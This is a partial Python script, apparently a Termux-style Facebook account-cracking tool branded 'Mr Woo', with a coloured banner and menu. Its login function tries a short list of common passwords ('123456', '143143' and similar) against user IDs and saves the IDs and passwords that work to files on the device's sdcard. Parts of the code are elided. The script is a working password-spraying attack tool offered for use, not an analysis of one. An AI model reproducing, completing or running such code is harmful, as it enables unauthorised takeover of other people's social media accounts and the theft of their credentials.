...
\x1b[1;34m════════════════════════════════════════════════════════
\033[1;33m▇==➤ 𝘼𝙙𝙢𝙞𝙣      : 𝑀𝓇 𝒲𝑜𝑜
\033[1;37m▇==➤ 𝙂𝙞𝙩𝙝𝙪𝙗     : 𝑀𝓇 𝒲𝑜𝑜
\033[1;35m▇==➤ 𝕺𝖜𝖓𝖊𝖗     : 𝑀𝓇 𝒲𝑜𝑜
\033[1;35m▇==➤ 𝕺𝖜𝖓𝖊𝖗     : 𝑀𝓇 𝒲𝑜𝑜
\033[1;36m▇==➤ 𝙁𝙖𝙘𝙚𝙗𝙤𝙤𝙠 : ❰ ⸙† 𝐇ɘɣ 𝐁ıtɕĦ 𝐘ə'ʬ 𝐍ɘ͜͡ɘd 𝐀 𝐏ɑ̂͜͡sspoɽƭ Ʈ𝐨 𝐕ıʂʈ 𝐌ɘʜ ⸙ 𓆣 ❱ 
\x1b[1;34m════════════════════════════════════════════════════════""")
#----------------------------[MAIN/DEF]-----------------------------------#
def main():
    user=[]
    ...
    os.system('clear')
    print(logo)
    print(f'\033[1;31m[\033[1;37m1\033[1;31m] \033[1;37m2010 ')
    lin()
...
def login(uid):
    ...
    try:
        sys.stdout.write(f'\r\x1b[38;5;196m[\x1b[38;5;48m𝙈𝙧𝙒𝙤𝙤\x1b[38;5;196m]\x1b[1;97m-\x1b[38;5;196m[\033[1;37m{loop}\x1b[38;5;196m]\x1b[1;97m-\x1b[38;5;196m[\x1b[38;5;46mOK•{len(oks)}\x1b[38;5;196m]')
        sys.stdout.flush()
        for pw in ["123456","1234567","12345678","123456789","123123","143143"]:
            ...
            if "session_key" in rp:
                print(f"\r\r\033[1;30m[\033[1;36m𝙈𝙧 𝙒𝙤𝙤\033[1;30m]\033[1;33m {uid} {A}•{G} {pw}")
                open("/sdcard/KAMINA-OK","a").write(uid+"|"+pw+"\n")
                oks.append(uid)
                break 
            elif "www.facebook.com" in rp["error_msg"]:
                print(f"\r\r\033[1;30m[\033[1;36m𝙈𝙧 𝙒𝙤𝙤\033[1;30m]\033[1;33m {uid} {A}•{G} {pw}")
                open("/sdcard/KAMINA-OK.txt","a").write(uid+"|"+pw+"\n")
                oks.append(uid)
                break
            else:continue
        loop+=1
